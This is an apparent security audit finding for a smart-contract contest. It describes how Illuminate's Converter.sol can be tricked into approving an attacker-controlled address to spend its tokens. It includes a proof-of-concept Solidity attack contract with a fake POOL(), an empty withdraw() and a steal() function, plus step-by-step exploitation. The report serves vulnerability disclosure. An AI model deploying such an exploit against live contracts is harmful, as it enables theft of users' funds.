ctf_sec

high

# Malicious actor can hijack to Converter execution flow and perform malicious approval in Converter.sol

## Summary

Malicious actor can hijack to Converter flow and perform malicious approval.

## Vulnerability Detail

Let us look into the implementation for converter.sol

```solidity
    /// @param c address of the compounding token
    /// @param u address of the underlying token
    /// @param a amount of tokens to convert
    function convert(
        address c,
        address u,
        uint256 a
    ) external {
        // first receive the tokens from msg.sender
        Safe.transferFrom(IERC20(c), msg.sender, address(this), a);

        // get Aave pool
        try IAaveAToken(c).POOL() returns (address pool) {
            // Allow the pool to spend the funds
            Safe.approve(IERC20(u), pool, a);
            // withdraw from Aave
            IAaveLendingPool(pool).withdraw(u, a, msg.sender);
        } 
```

note the external call without validation giving away the whole execution flow in the hand of hackers.

The hacker can use this contract to approve token allowance:

```solidity

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IAaveLendingPool {
    function withdraw(
        address,
        uint256,
        address
    ) external;

    // only used by integration tests
    function deposit(
        address,
        uint256,
        address,
        uint16
    ) external;
}

contract Hack is ERC20 {

    function mint(uint256 amount) {
        _mint(msg.sender, amount);
    }

    function POOL() external returns (address) {
            return address(this);
    }
    
    function withdraw(
        address,
        uint256,
        address
    ) external {
        // do nothing
    }

    function steal(address converter, address token, uint256 amount) external {
        IERC20(token).transferFrom(converter, msg.sender, amount);
    }

}
```

First the hacker deploy this contract,

then given the parameter,

```solidity
    /// @param c address of the compounding token
    /// @param u address of the underlying token
    /// @param a amount of tokens to convert
    function convert(
        address c,
        address u,
        uint256 a
    ) external {
```

hacker choose the address c as the address of the Hack contract.

the hacker needs to mint some token to bypass:

```solidity
 Safe.transferFrom(IERC20(c), msg.sender, address(this), a);
```

then code executes

```solidity
  try IAaveAToken(c).POOL() returns (address pool) {
```

this corresponds to:

```solidity
    function POOL() external returns (address) {
            return address(this);
    }
```

Ok now the address pool is still the hack address.

then this is important.

```solidity
Safe.approve(IERC20(u), pool, a);
```

The hacker can just pick a token address(u), then the contract pool, which is the hack address, have the spending power of amount a in Converter.sol.

Then the code executes:

```solidity
    IAaveLendingPool(pool).withdraw(u, a, msg.sender);
```

In the contract hack, we do nothing:

```solidity
    function withdraw(
        address,
        uint256,
        address
    ) external {
        // do nothing
    }
```

## Impact

Then any fund that is in Converter is not safe. Maybe when user redeem, the redeem call converter, the converter sliently fail in Compound redeem, the c token stucked in the contract.

I submitted another report explaining how compound redeem can fail silently:

https://github.com/sherlock-audit/2022-10-illuminate-ctf-sec/issues/5

Then after the hacker observe the stucked c token in the contract, he can call steal to complete the exploit

```solidity
    function steal(address converter, address token, uint256 amount) external {
        IERC20(token).transferFrom(converter, msg.sender, amount);
    }
```

## Code Snippet

https://github.com/sherlock-audit/2022-10-illuminate/blob/main/src/Converter.sol#L16-L35

## Tool used

Manual Review

## Recommendation

Whitelist the external contract in Converter.sol!
